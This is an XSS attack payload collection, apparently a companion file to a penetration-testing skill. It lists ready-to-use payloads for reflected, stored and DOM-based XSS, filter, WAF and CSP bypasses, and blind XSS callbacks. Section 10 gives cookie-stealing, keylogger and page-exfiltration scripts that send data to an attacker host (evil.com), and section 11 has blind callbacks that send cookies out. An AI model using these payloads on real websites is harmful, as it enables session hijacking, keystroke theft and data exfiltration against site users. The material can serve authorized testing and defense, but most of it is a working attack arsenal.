# XSS Payloads / Attack Payloads

> This file is a companion to `SKILL.md`, containing a complete collection of XSS attack payloads organized by category.

---

## Index

1. [XSS Detection Payloads](#1-xss-detection-payloads)
2. [Reflected XSS](#2-reflected-xss)
3. [Stored XSS](#3-stored-xss)
4. [DOM-based XSS](#4-dom-based-xss)
5. [Event Handler Alternatives](#5-event-handler-alternatives)
6. [Encoding Bypass](#6-encoding-bypass)
7. [WAF Bypass Techniques](#7-waf-bypass-techniques)
8. [SVG / MathML Injection](#8-svg--mathml-injection)
9. [CSP Bypass Techniques](#9-csp-bypass-techniques)
10. [Cookie Stealing / Session Hijacking](#10-cookie-stealing--session-hijacking)
11. [Blind XSS](#11-blind-xss)

---

## 1. XSS Detection Payloads

Basic detection to confirm that the input point is controllable in the HTML context and the output is unencoded.

```bash
# Most basic detection -- if alert fires, XSS is confirmed
https://target.com/search?q=<script>alert(1)</script>

# Event handler detection (when <script> tags are filtered)
https://target.com/search?q=<img src=x onerror=alert(1)>
https://target.com/search?q=<svg onload=alert(1)>
https://target.com/search?q=<body onload=alert(1)>
https://target.com/search?q=<input onfocus=alert(1) autofocus>

# Non-alert detection (suitable for scenarios where alerts cannot be seen)
https://target.com/search?q=<img src=x onerror=console.log('XSS')>
https://target.com/search?q=<script>document.title='XSS'</script>
```

---

## 2. Reflected XSS

Malicious payloads are submitted via URL parameters or forms, and the server embeds the input as-is into the response HTML.

```bash
# Basic detection -- confirm input point in HTML context
https://target.com/search?q=<script>alert(1)</script>

# When <script> is filtered, use event handlers
https://target.com/search?q=<img src=x onerror=alert(1)>
https://target.com/search?q=<svg onload=alert(1)>
https://target.com/search?q=<body onload=alert(1)>
https://target.com/search?q=<input onfocus=alert(1) autofocus>

# Attribute value context escape (input lands in value="...")
https://target.com/search?q=" onmouseover=alert(1) "
https://target.com/search?q=' onfocus=alert(1) autofocus x='

# JavaScript context escape (input lands in <script> var='...')
https://target.com/search?q=';alert(1);//
https://target.com/search?q='-alert(1)-'
```

---

## 3. Stored XSS

Malicious payloads are persistently stored, and all users who access the data will trigger execution.

```bash
# User nickname/comment -- persistent malicious payload
Username: <img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>

# Filename injection -- uploaded filename contains XSS payload
Filename: "><svg onload=alert(1)>.png

# User-Agent / Referer Header -- admin panel may echo these
User-Agent: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

---

## 4. DOM-based XSS

The entire attack occurs on the client side without server involvement.

```javascript
// Vulnerable code example: using location.hash directly to write to DOM
// document.getElementById('output').innerHTML = location.hash.slice(1);

// Exploiting innerHTML:
https://target.com/page#<img src=x onerror=alert(1)>

// document.write injection
https://target.com/page?lang=en"><script>alert(1)</script>

// jQuery selector injection (CVE-2020-11022/23)
$("#element").html(location.hash);
// Exploit: #<img src=x onerror=alert(1)>

// eval / setTimeout / setInterval injection
// Vulnerable code: eval("var data = " + userInput);
// Exploit: 1;alert(1)//
```

---

## 5. Event Handler Alternatives

When common tags are filtered, use alternative event handlers and tags.

```html
<!-- Basic event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- Advanced event handlers -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- Animation events -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

## 6. Encoding Bypass

Bypass keyword-based filters using different encoding methods.

### HTML Entity Encoding

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg/onload="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">
```

### URL Encoding / Double Encoding

```bash
# URL encoding
%3Cscript%3Ealert(1)%3C/script%3E

# Double encoding
%253Cscript%253Ealert(1)%253C/script%253E
```

### Unicode Encoding

```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### Base64 Encoding

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

---

## 7. WAF Bypass Techniques

### Mixed Case

```html
<ScRiPt>alert(1)</ScRiPt>
<iMg SrC=x OnErRoR=alert(1)>
```

### Double Encoding

```bash
%253Cscript%253Ealert(1)%253C/script%253E
```

### HTML Entity Encoding

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg/onload="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">
```

### Unicode Encoding

```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### String Concatenation to Bypass Keyword Detection

```html
<script>window['al'+'ert'](1)</script>
<img src=x onerror="window['al'+'ert'](docu['ment']['coo'+'kie'])">
```

### Newline/Tab Interference

```html
<svg/onload
=
alert(1)>
<img src=x	onerror=alert(1)>
```

### Null Byte Injection (some WAF parsing truncation)

```bash
<scr%00ipt>alert(1)</script>
```

### Template Literal

```html
<script>alert`1`</script>
<img src=x onerror=alert`${document.cookie}`>
```

---

## 8. SVG / MathML Injection

Exploit SVG and MathML features to inject scripts, commonly used to bypass WAFs that only filter HTML tags.

```html
<!-- SVG animate -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- SVG set -->
<svg><set onbegin=alert(1) attributeName=x to=1>

<!-- MathML nesting -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- SVG foreignObject -->
<svg><foreignObject><body onload=alert(1)>

<!-- SVG script -->
<svg><script>alert(1)</script></svg>
```

---

## 9. CSP Bypass Techniques

Exploit Content Security Policy configuration flaws to bypass script execution restrictions.

```html
<!-- Exploit JSONP endpoint to bypass script-src restriction -->
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>

<!-- Exploit unsafe-eval -->
<script>eval("alert(1)")</script>

<!-- Exploit base tag to hijack resource loading -->
<base href="https://evil.com/">
<script src="/payload.js"></script>

<!-- Exploit object tag -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- Exploit meta tag redirect (with URL parameter to pass payload) -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

---

## 10. Cookie Stealing / Session Hijacking

Post-exploitation payloads that demonstrate the actual impact of XSS vulnerabilities.

### Cookie Stealing

```javascript
// Cookie stealing + exfiltration
new Image().src = 'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
```

### Keylogger

```javascript
// Complete keylogger
document.addEventListener('keypress', function(e) {
    new Image().src = 'https://evil.com/log?key=' + encodeURIComponent(e.key);
});
```

### Page Content Stealing

```javascript
// Page content stealing
new Image().src = 'https://evil.com/exfil?html=' + encodeURIComponent(document.body.innerHTML);
```

---

## 11. Blind XSS

Inject payloads with external callbacks in locations where the response cannot be directly seen.

```bash
# Use external callback server to verify execution
"><script src=https://your-callback.oastify.com></script>
"><img src=https://your-callback.oastify.com/log?c="+document.cookie>

# Use XSStrike blind mode
python xsstrike.py -u "http://target.com/form" --blind

# Use Dalfox blind mode
dalfox url "http://target.com/form" -b https://your-callback.oastify.com

# XSS Hunter callback (professional blind XSS platform)
"><script src=https://xsshunter.com/YOUR_PAYLOAD_ID></script>
"'-alert(1)-'
"><img src=x onerror="fetch('https://YOUR_SUBDOMAIN.xss.ht/?c='+document.cookie)">
```
